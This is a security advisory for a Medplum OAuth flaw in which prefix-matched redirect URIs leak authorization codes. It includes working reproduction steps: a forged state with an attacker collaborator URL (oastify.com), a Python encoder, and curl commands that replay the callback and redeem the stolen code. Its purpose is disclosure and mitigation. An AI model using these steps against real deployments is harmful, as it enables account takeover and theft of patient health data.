# [H] Medplum: Improper Validation of Redirect URI in External Auth Callback allows Authorization Code Leakage

## Summary
Severity: High
Advisory: GHSA-m44r-7c5h-m6mj
CVE: CVE-2026-53728
CWE: CWE-345, CWE-601
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-m44r-7c5h-m6mj
Type: github-advisory

## Affected
- npm: `@medplum/core` — affected >=0 <5.1.6

## Details
## Summary

The external identity provider callback at `GET /auth/external` accepts attacker-controlled redirect URIs that only need to start with a registered client redirect URI, rather than matching exactly. After a successful external IdP login, the server appends Medplum `login` and `code` values to that attacker-supplied URL and issues a redirect.

Because the external login request `state` is serialized as raw JSON and later trusted by the callback, an attacker who can tamper with `state.redirectUri` can cause Medplum to redirect authorization artifacts to an attacker-controlled endpoint. When the registered redirect URI is a bare origin or another prefix that can be extended into a different hostname, this becomes a cross-origin authorization code leak.

## Technical Explanation

The vulnerable flow is exposed on the unauthenticated callback route `GET /auth/external`.

In `externalCallbackHandler()`, the server parses the external auth `state` and uses the decoded `clientId` and `redirectUri` after completing the IdP code exchange. If login succeeds and a client is found, the handler calls:

- `getClientRedirectUri(client, body.redirectUri, true)`

The third argument explicitly enables partial matching. In `getClientRedirectUri()`, the function returns the attacker-supplied `requestedUri` whenever:

- `requestedUri.startsWith(uri)`

As a result, any redirect URI beginning with a registered value is accepted. The returned URL is then passed into `new URL(redirectUri)`, and the server appends `login` and `code` query parameters before calling `res.redirect()`.

Although `externalCallbackHandler()` later performs an exact-match lookup, that result is only used for logging and does not block the redirect. Therefore, the request is still redirected to the attacker-controlled URL even when it is not an exact registered redirect URI.

A practical exploitation detail is that the registered redirect URI must be a prefix that can also prefix a different origin. For example:

- Registered: `http://callback.audit.local`
- Malicious: `http://callback.audit.local.oastify.com/cb`

The client-side external auth flow serializes the login request directly into the IdP `state` as JSON, which makes tampering straightforward in an intercepted or manually crafted authorization request.

## Steps to Reproduce

### Preconditions

- The target `ClientApplication` has an `identityProvider` configured.
- The target client has a registered redirect URI that is prefix-matchable into an attacker-controlled hostname, for example:
  - Registered redirect URI: `http://callback.audit.local`
- The attacker controls a collaborator endpoint such as:
  - `https://<collaborator-host>/cb`
- The attacker uses a forged `state.redirectUri` that starts with the registered value, for example:
  - `http://callback.audit.local.oastify.com/cb`
  - or a collaborator domain that matches your local proof setup

### Example forged state

`{"clientId":"<medplum-client-id>","redirectUri":"http://callback.audit.local.oastify.com/cb","codeChallenge":"attack-verifier-123","codeChallengeMethod":"plain"}`

**URL-encode the forged state**

```
python3 - <<'PY'
import json, urllib.parse
state = {
  "clientId": "<medplum-client-id>",
  "redirectUri": "http://callback.audit.local.oastify.com/cb",
  "codeChallenge": "attack-verifier-123",
  "codeChallengeMethod": "plain",
}
print(urllib.parse.quote(json.dumps(state, separators=(',', ':'))))
PY
```

**Replay the external callback with cURL**
Use a valid IdP authorization code obtained from a normal external login flow, then call the vulnerable callback directly:
`curl -i 'http://api.audit.local:8103/auth/external?code=<valid-idp-code>&state=<URLENCODED_FORGED_STATE>`

Expected result
The response is a 302 redirect to the attacker-controlled endpoint, including Medplum authorization artifacts in the query string:

```
HTTP/1.1 302 Found
Location: http://callback.audit.local.oastify.com/cb?login=<login-id>&code=<medplum-auth-code>
```

**Collaborator proof**
If redirectUri points to a Burp Collaborator, Interactsh, or another attacker-controlled HTTP endpoint, that service receives the inbound request containing the leaked code in the query string. This demonstrates that Medplum is willing to forward authorization artifacts to an attacker-controlled destination when state.redirectUri only prefix-matches a registered client redirect URI.

**Optional impact validation**
If the attacker supplied the PKCE verifier in the forged state, the leaked Medplum code can then be redeemed:

```
curl -i -X POST 'http://api.audit.local:8103/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=authorization_code&code=<medplum-auth-code>&code_verifier=attack-verifier-123'
```

## Impact

The impact of this vulnerability is Critical, as it facilitates a full Account Takeover (ATO) of any user utilizing the external identity provider (IdP) flow. 

1. Full Account Takeover (ATO): 
An attacker can successfully intercept the Medplum authorization 'code'. Because the attacker controls the 'state' object, they can provide their own PKCE 'code_challenge'. This allows the attacker to redeem the stolen code for a valid access token without knowing the victim's original secret, leading to total session hijacking.

2. Bypassing Modern OAuth Protections: 
This flaw explicitly bypasses the security benefits of PKCE (Proof Key for Code Exchange). By allowing an attacker to inject their own PKCE parameters into the tampered state, the server's verification mechanism is rendered useless against this specific redirection attack.

3. Cross-Origin Data Leakage: 
The 'startsWith' logic allows an attacker to break out of the intended origin. For example, a registered URI for 'https://app.medplum.com' could be extended to 'https://app.medplum.com.attacker.com', tricking the user and the browser's security model into sending sensitive credentials to an external host.

4. Access to Sensitive Healthcare Data (PHI):
Given Medplum's role as a healthcare platform, a successful compromise grants the attacker the same permissions as the victim, potentially exposing Protected Health Information (PHI) and violating HIPAA or other regulatory compliance standards.

5. Victim Trust Exploitation:
The attack occurs during a legitimate login flow. The victim interacts with the official Medplum server and their trusted IdP (e.g., Google or Microsoft), making the final redirection to the attacker-controlled URL nearly impossible for an average user to detect.

## Mitigation
- Require exact string equality for redirect URIs.
- Bind external auth state to a server-side session or use a HMAC/Signature.
- Reject prefixable or ambiguous redirect URI shapes during registration.

## References
- https://github.com/medplum/medplum/security/advisories/GHSA-m44r-7c5h-m6mj
- https://github.com/medplum/medplum/pull/8749
- https://github.com/medplum/medplum/commit/7ae10035ddadde4dba7b18d3156553940465b3a1
- https://github.com/medplum/medplum
- https://github.com/medplum/medplum/releases/tag/v5.1.6
